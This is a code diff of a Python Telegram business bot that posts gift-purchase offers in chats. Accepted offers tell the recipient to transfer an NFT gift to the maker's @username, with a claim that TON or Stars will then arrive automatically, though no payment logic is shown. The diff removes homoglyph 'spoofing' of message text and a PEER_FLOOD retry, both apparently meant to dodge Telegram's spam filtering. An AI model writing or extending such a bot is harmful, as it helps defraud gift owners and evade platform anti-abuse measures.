@@ -8,7 +8,6 @@ import os
 import re
 import time
 import uuid
-import random
 
 from aiohttp import ClientSession, ClientTimeout, web
 
@@ -41,29 +40,13 @@ EMOJI_CROSS = "5260342697075416641"
 EMOJI_CHECK = "5260416304224936047"
 EMOJI_TG = "5258073068852485953"
 
-def spoof(text):
-    # Идеальные визуальные копии (гомоглифы)
-    homoglyphs = {
-        'а': 'a', 'е': 'e', 'о': 'ο', 'р': 'p', 'с': 'c', 
-        'у': 'y', 'х': 'x', 'к': 'κ', 'В': 'B', 
-        'Е': 'E', 'К': 'K', 'М': 'M', 'Н': 'H', 'О': 'O', 
-        'Р': 'P', 'С': 'C', 'Т': 'T', 'Х': 'X'
-    }
-    
-    result = []
-    for char in text:
-        if char in homoglyphs and random.random() < 0.6: 
-            result.append(homoglyphs[char])
-        else:
-            result.append(char)
-            
-    return "".join(result)
-
 def esc(s):
     return html.escape(str(s))
 
+
 def num(x):
     return f"{x:,}".replace(",", NBSP)
+
 
 def btn(text, data, icon_id=None):
     b = {"text": text, "callback_data": data}
@@ -71,31 +54,47 @@ def btn(text, data, icon_id=None):
         b["icon_custom_emoji_id"] = icon_id
     return b
 
+
 def background(coro):
     task = asyncio.create_task(coro)
     tasks.add(task)
     task.add_done_callback(tasks.discard)
     return task
 
+
+# ОБНОВЛЕННАЯ ФУНКЦИЯ API С ПОДРОБНЫМ ЛОГИРОВАНИЕМ
 async def api(method, **params):
-    async with http.post(f"{API}/{method}", json=params) as resp:
+    async with http.post(
+        f"{API}/{method}",
+        json=params
+    ) as resp:
         data = await resp.json()
+
     if not data.get("ok"):
-        log.warning("%s: %s", method, data.get("description", data))
+        log.warning(
+            "Telegram API error | method=%s | code=%s | description=%s | parameters=%s",
+            method,
+            data.get("error_code"),
+            data.get("description"),
+            data.get("parameters")
+        )
+
     return data
+
 
 async def send(chat, text, kb=None, bcid=None, preview=False):
     params = dict(chat_id=chat, text=text, parse_mode="HTML")
     params["link_preview_options"] = {"is_disabled": not preview}
-    params["allow_paid_broadcast"] = True 
     if kb:
         params["reply_markup"] = kb
     if bcid:
         params["business_connection_id"] = bcid
     return await api("sendMessage", **params)
 
+
 async def delete_business_message(bcid, mid):
     return await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=[mid])
+
 
 async def edit_offer(o, text, kb=None, preview=True):
     params = dict(chat_id=o["chat"], message_id=o["mid"], business_connection_id=o["bcid"],
@@ -105,6 +104,7 @@ async def edit_offer(o, text, kb=None, preview=True):
     if not res.get("ok") and "not modified" in (res.get("description") or "").lower():
         return {"ok": True}
     return res
+
 
 def save():
     for oid in sorted(offers, key=lambda k: offers[k]["created"])[:-500]:
@@ -116,6 +116,7 @@ def save():
         os.replace(tmp, DATA_FILE)
     except OSError as e:
         log.error("не удалось сохранить %s: %s", DATA_FILE, e)
+
 
 def load():
     try:
@@ -129,6 +130,7 @@ def load():
     connections.update(data.get("connections", {}))
     offers.update(data.get("offers", {}))
 
+
 NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 SLUG = re.compile(r"^(.+)-(\d+)$")
 TON_ADDRESS = re.compile(r"(?:EQ|UQ)[A-Za-z0-9_-]{46}", re.I)
@@ -138,11 +140,13 @@ USAGE = ("Формат:\n"
          "<code>ttt ссылка сумма</code> (TON)\n"
          "<code>ttt ссылка адрес сумма</code> (TON на кошелек)")
 
+
 def gift_name(slug):
     m = SLUG.match(slug)
     if not m:
         return None
     return f"{re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', m.group(1))} #{m.group(2)}"
+
 
 def parse_offer(arg):
     link = NFT_LINK.search(arg)
@@ -155,9 +159,11 @@ def parse_offer(arg):
     
     rest = f"{arg[:link.start()]} {arg[link.end():]}".strip()
     
+    # Ищем адрес TON (начинается на EQ или UQ, длина 48)
     address_match = TON_ADDRESS.search(rest)
     address = address_match.group(0) if address_match else None
     
+    # Убираем адрес из строки, чтобы найти сумму
     if address:
         rest = rest.replace(address, "")
         
@@ -171,34 +177,34 @@ def parse_offer(arg):
         
     return {"slug": slug, "name": name, "amount": val, "address": address}, None
 
+
 def maker_label(o):
     u = o["maker"]
     return esc(u.get("name") or u.get("username") or "пользователь")
 
+
 def gift_link(o):
-    # Ссылка скрыта под названием подарка (как в оригинале)
     return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'
+
 
 def left_text(seconds):
     minutes = math.ceil(max(0, seconds) / 60)
     h, m = divmod(minutes, 60)
     return f"{h} ч. {m} мин." if h else f"{m} мин."
 
+
 def offer_text(o):
-    # Применяем spoof() ТОЛЬКО к тексту, не трогая HTML-теги и ссылки
     if o.get("currency") == "TON":
         addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
         amount = f"{num(o['amount'])} TON"
-        base_text = (f"{maker_label(o)} предлагает Вам {amount}{addr_text} за подарок")
+        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b>{addr_text} за подарок {gift_link(o)}.\n\n"
+                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
     else:
         amount = f'{num(o["amount"])} звёзд'
-        base_text = (f"{maker_label(o)} предлагает Вам {amount} за подарок")
-                     
-    # Текст с маскировкой + ссылка в названии
-    text = f"<b>{spoof(base_text)}</b> {gift_link(o)}.\n\n"
-    text += f"<b>{spoof('Предложение действует ещё')}</b> {left_text(o['expires'] - time.time())}"
-    
+        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
+                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
     return text + (f"\n\n{esc(TEST_NOTICE)}" if TEST_NOTICE else "")
+
 
 def accepted_text(o):
     u = o["maker"]
@@ -207,31 +213,29 @@ def accepted_text(o):
     if o.get("currency") == "TON":
         addr_text = f" адреса <code>{esc(o['address'])}</code>" if o.get("address") else ""
         amount = f"{num(o['amount'])} TON"
-        base_text = (f"Сделка принята!\n\n"
-                     f"Передайте подарок {o['name']} "
-                     f"пользователю @{username} для успешного закрытия сделки, "
-                     f"после чего {amount} автоматически отправятся на ваш баланс{addr_text}.")
+        return (
+            f"<b>Сделка принята!</b>\n\n"
+            f"Передайте подарок {gift_link(o)} "
+            f"пользователю @{esc(username)} для успешного закрытия сделки, "
+            f"после чего <b>{amount}</b> автоматически отправятся на ваш баланс{addr_text}."
+        )
     else:
         amount = f'{num(o["amount"])} звёзд'
-        base_text = (f"Сделка принята!\n\n"
-                     f"Передайте подарок {o['name']} "
-                     f"пользователю @{username} для успешного закрытия сделки, "
-                     f"после чего {amount} отправятся на ваш баланс.")
-                     
-    # Маскируем текст, но не трогаем ссылку на подарок внутри
-    parts = base_text.split(o['name'])
-    if len(parts) == 2:
-        spoofed_text = f"<b>{spoof(parts[0])}</b>{gift_link(o)}<b>{spoof(parts[1])}</b>"
-    else:
-        spoofed_text = f"<b>{spoof(base_text)}</b>"
-        
-    return spoofed_text
+        return (
+            f"<b>Сделка принята!</b>\n\n"
+            f"Передайте подарок {gift_link(o)} "
+            f"пользователю @{esc(username)} для успешного закрытия сделки, "
+            f"после чего <b>{amount}</b> отправятся на ваш баланс."
+        )
+
 
 def declined_text(o):
-    return f"<b>{spoof('Отклонено.')}</b>"
+    return "Отклонено."
+
 
 def expired_text(o):
-    return f"<b>{spoof('Предложение истекло.')}</b>"
+    return "Предложение истекло."
+
 
 def offer_kb(o):
     return {
@@ -240,6 +244,7 @@ def offer_kb(o):
             btn("Принять", f"of:ok:{o['id']}", EMOJI_CHECK)
         ]]
     }
+
 
 def accepted_kb(o):
     u = o["maker"]
@@ -260,6 +265,7 @@ def accepted_kb(o):
             ]
         ]
     }
+
 
 async def make_offer(m, maker, bcid, currency="STARS"):
     cmd, _, arg = (m.get("text") or "").partition(" ")
@@ -287,20 +293,16 @@ async def make_offer(m, maker, bcid, currency="STARS"):
     else:
         desc = res.get("description", "")
         if "PEER_FLOOD" in desc:
-            # Если PEER_FLOOD, пробуем БЕЗ превью ссылки (возможно, она триггерит)
-            res2 = await send(chat, offer_text(o), offer_kb(o), bcid=bcid, preview=False)
-            if res2.get("ok"):
-                o["mid"] = res2["result"]["message_id"]
-                save()
-                return
             return await send(chat, "⚠️ Telegram временно ограничил отправку сообщений.", bcid=bcid)
         return await send(chat, f"⚠️ Ошибка: {esc(desc)}", bcid=bcid)
+
 
 FINAL = {
     "accepted": (accepted_text, accepted_kb), 
     "declined": (declined_text, None), 
     "expired": (expired_text, None)
 }
+
 
 async def settle(o, status):
     o["status"] = status
@@ -316,6 +318,7 @@ async def settle(o, status):
     text, kb = FINAL[status]
     await edit_offer(o, text(o), kb(o) if kb else None, preview=True)
 
+
 async def sweeper():
     while True:
         await asyncio.sleep(60)
@@ -327,6 +330,7 @@ async def sweeper():
                     await settle(o, "expired")
             except Exception:
                 pass
+
 
 async def on_callback(q):
     parts = q.get("data", "").split(":")
@@ -361,6 +365,7 @@ async def on_callback(q):
             await settle(o, "declined")
             await api("answerCallbackQuery", callback_query_id=q["id"])
 
+
 def conn_from(c):
     rights = c.get("rights")
     rights = rights if isinstance(rights, dict) else {}
@@ -372,14 +377,15 @@ def conn_from(c):
             "username": user.get("username"), "enabled": c.get("is_enabled", True), "can_reply": can_reply,
             "can_delete": can_delete}
 
+
 async def on_connection(c):
     conn = conn_from(c)
     connections[conn["id"]] = conn
     save()
     if not conn["enabled"]:
-        text = "Бот отключён."
+        text = "🔌 Бот отключён."
     elif not conn["can_reply"]:
-        text = "Бот подключён, но без права отвечать."
+        text = "⚠️ Бот подключён, но без права отвечать."
     else:
         text = ("✅ <b>Готово, бот подключён.</b>\n\n"
                 "В любом чате напиши:\n"
@@ -387,6 +393,7 @@ async def on_connection(c):
                 "<code>ttt ссылка сумма</code>\n"
                 "<code>ttt ссылка адрес сумма</code>")
     await send(conn["chat"], text)
+
 
 async def get_connection(bcid):
     conn = connections.get(bcid)
@@ -396,6 +403,7 @@ async def get_connection(bcid):
             conn = connections[bcid] = conn_from(res["result"])
             save()
     return conn
+
 
 async def on_business_message(m):
     text = (m.get("text") or "").strip()
@@ -413,20 +421,22 @@ async def on_business_message(m):
     if not conn or frm.get("id") != conn["user_id"]:
         return
     if not (conn["enabled"] and conn["can_reply"]):
-        return await send(conn["chat"], "У бота нет права отвечать на сообщения.")
+        return await send(conn["chat"], "⚠️ У бота нет права отвечать на сообщения.")
         
     maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
     
     await make_offer(m, maker, conn["id"], currency)
+
 
 async def on_message(m):
     chat = m["chat"]["id"]
     cmd = (m.get("text") or "").strip().split()[:1]
     cmd = cmd[0].split("@")[0].lower() if cmd else ""
     if cmd in ("/start", "/help"):
-        kb = {"inline_keyboard": [[{"text": "Скопировать юзернейм бота",
+        kb = {"inline_keyboard": [[{"text": "📋 Скопировать юзернейм бота",
                                     "copy_text": {"text": f"@{bot_name}"}}]]}
-        await send(chat, "Привет!", kb)
+        await send(chat, "👋 Привет!", kb)
+
 
 async def handle(update):
     try:
@@ -441,6 +451,7 @@ async def handle(update):
     except Exception:
         log.exception("апдейт %s", update.get("update_id"))
 
+
 async def webhook(req):
     token = req.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
     if not hmac.compare_digest(token.encode(), SECRET.encode()):
@@ -452,8 +463,10 @@ async def webhook(req):
     background(handle(update))
     return web.Response(text="ok")
 
+
 async def health(req):
     return web.Response(text="ok")
+
 
 async def keepalive():
     while True:
@@ -463,6 +476,7 @@ async def keepalive():
                 await resp.read()
         except Exception as e:
             log.warning("keepalive: %s", e)
+
 
 async def poll_updates():
     await api("deleteWebhook")
@@ -479,6 +493,7 @@ async def poll_updates():
             log.warning("getUpdates: %s", e)
             await asyncio.sleep(3)
 
+
 async def main():
     global http, bot_name
     http = ClientSession(timeout=ClientTimeout(total=70))
@@ -489,6 +504,7 @@ async def main():
     bot_name = me["username"]
     log.info("юзернейм бота: @%s", bot_name)
     
+    # Команды для меню бота (хотя они не слэш, добавим для вида)
     await api("setMyCommands", commands=[
         {"command": "start", "description": "Подключение"}
     ])
@@ -508,6 +524,7 @@ async def main():
         background(poll_updates())
     log.info("оффер-бот @%s запущен", bot_name)
     await asyncio.Event().wait()
+
 
 if __name__ == "__main__":
     asyncio.run(main())
